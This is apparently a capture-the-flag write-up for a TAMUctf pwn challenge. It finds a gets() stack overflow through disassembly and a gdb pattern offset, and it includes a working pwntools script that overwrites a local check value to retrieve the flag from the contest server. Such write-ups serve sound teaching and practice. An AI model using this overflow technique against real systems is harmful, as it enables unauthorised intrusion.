```
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

This challenge is a simple pwnable that requires us to supply a secret password.  If we start the program we're greeted by the following message, which then awaits input.

```
This is a super secret program
Noone is allowed through except for those who know the secret!
What is my secret?
```

If we test this for a buffer-overflow, we find that in fact it is exploitable to a classic buffer overflow, but as everything has been written within the `main` function, we won't overwrite EIP.  Instead we'll overwrite the stack-pointer.
```
Invalid $SP address: 0x4129413d
```
This makes our task much more difficult, so it's likely this isn't the intended method.  Instead we'll open it up in a disassembler:

```gdb
|           0x080485ff      e8ecfdffff     call sym.imp.puts           ; int puts(const char *s)
|           0x08048604      83c410         add esp, 0x10
|           0x08048607      c745f4000000.  mov dword [local_ch], 0
|           0x0804860e      83ec0c         sub esp, 0xc
|           0x08048611      8d45dd         lea eax, dword [local_23h]
|           0x08048614      50             push eax
|           0x08048615      e8b6fdffff     call sym.imp.gets           ; char*gets(char *s)
|           0x0804861a      83c410         add esp, 0x10
|           0x0804861d      817df411ba07.  cmp dword [local_ch], 0xf007ba11 ; [0xf007ba11:4]=-1
|       ,=< 0x08048624      7507           jne 0x804862d
|       |   0x08048626      e820ffffff     call sym.print_flag
```

The offending function is here.   It's looking for 0xf007ba11 in our input.  This isn't a direct comparison with our input however.  If we input this directly into our input, it will still fail.  I imagine it's possible to work this out from the disassembly, but let's just insert a breakpoint and work it out using a pattern:
```
gdb-peda$ break *0x0804861d
Breakpoint 1 at 0x804861d
gdb-peda$ pattern create 50
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'
gdb-peda$ r
Starting program: /root/Desktop/tamuctf/pwn1 
This is a super secret program
Noone is allowed through except for those who know the secret!
What is my secret?
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA
```
Our program will pause at the comparison.
```
=> 0x804861d <main+107>:	cmp    DWORD PTR [ebp-0xc],0xf007ba11
```
So we examine the memory and calculate the offset, remembering that it's a little-endian system:
```
gdb-peda$ x/4x $ebp-0xc
0xffffd37c:	0x41	0x28	0x41	0x41
gdb-peda$ pattern offset 0x41412841
1094789185 found at offset: 23
```
So we have to insert the value at position 23.  See my solution below:
```python
from pwn import * 

r = remote('pwn.ctf.tamu.edu', 4321) 
message = 'A'*23+p32(0xf007ba11)+'\n'
r.sendafter('What is my secret?', message) 
print r.recvline_contains('gigem') 
```
Run it, and we get our flag:
```bash
root@kali:~/Desktop/tamuctf# python pwn1.py
[+] Opening connection to pwn.ctf.tamu.edu on port 4321: Done
gigem{H0W_H4RD_1S_TH4T?}
[*] Closed connection to pwn.ctf.tamu.edu port 4321
```
